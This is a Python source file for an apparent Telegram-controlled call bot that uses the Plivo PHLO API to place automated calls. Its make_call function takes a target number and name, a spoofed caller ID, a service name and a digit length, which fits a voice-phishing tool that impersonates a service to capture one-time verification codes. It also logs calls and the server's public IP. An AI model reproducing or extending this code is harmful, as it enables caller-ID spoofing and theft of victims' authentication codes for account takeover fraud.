import plivo
import requests
import json
import os
import re

# RELLENA ESTOS DATOS
PLIVO_ID = "TU_PLIVO_AUTH_ID"
PLIVO_TOKEN = "TU_PLIVO_AUTH_TOKEN"
PHLO_ID = "TU_PHLO_ID"

plivo_client = plivo.RestClient(PLIVO_ID, PLIVO_TOKEN)

# Crear carpetas y archivos si no existen
if not os.path.exists('calls'):
    os.makedirs('calls')

for f_name in ['current.json', 'previous.json']:
    if not os.path.exists(f'calls/{f_name}'):
        with open(f'calls/{f_name}', 'w') as f: json.dump({}, f)
if not os.path.exists('calls/server.json'):
    with open('calls/server.json', 'w') as f: json.dump([], f)

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "127.0.0.1"

def make_call(target, target_name, spoof, service_c, digits_c, msg, module, forward_call, type_c):
    chat_id = str(msg.chat.id) # msg es el objeto update.message de Telegram

    if target and target_name and spoof and service_c and digits_c and module:
        ip_address = get_public_ip()
        
        payload = {
            'from': spoof,
            'to': target,
            'name': target_name,
            'service': service_c,
            'digits': digits_c,
            'userid': chat_id,
            'addy': ip_address,
            'm': module,
            'f': forward_call if forward_call is not None else type_c
        }

        try:
            # Ejecutar PHLO
            response = plivo_client.phlo.get(PHLO_ID).run(**payload)
            
            # Intentar obtener UUID. En JS usabas JSON.parse(result.message). En Python sdk suele ser response.api_id
            request_uuid = getattr(response, 'api_id', 'UNKNOWN_UUID')
            print(f'Phlo run result: {request_uuid}')

            # Actualizar current.json
            with open('calls/current.json', 'r') as f: object_of = json.load(f)
            
            # Limpieza del target (igual que tu regex en JS)
            clean_target = re.sub(r"[\(\)\-\.\s]", "", target)
            
            object_of[chat_id] = [clean_target, request_uuid, True if forward_call is not None else False]
            with open('calls/current.json', 'w') as f: json.dump(object_of, f)

            # Actualizar server.json
            with open('calls/server.json', 'r') as f: all_calls = json.load(f)
            all_calls.append(request_uuid)
            with open('calls/server.json', 'w') as f: json.dump(all_calls, f)

            # Actualizar previous.json
            if type_c is None:
                with open('calls/previous.json', 'r') as f: add_to = json.load(f)
                add_to[str(msg.from_user.id)] = {
                    "callType": "DEFAULT",
                    "modType": module,
                    "toCall": clean_target,
                    "toName": target_name,
                    "servCall": spoof,
                    "servName": service_c,
                    "digLength": digits_c,
                    "forwardTo": None
                }
                with open('calls/previous.json', 'w') as f: json.dump(add_to, f)

        except Exception as e:
            print(f"Phlo run failed: {e}")
    else:
        print("Missing Field")
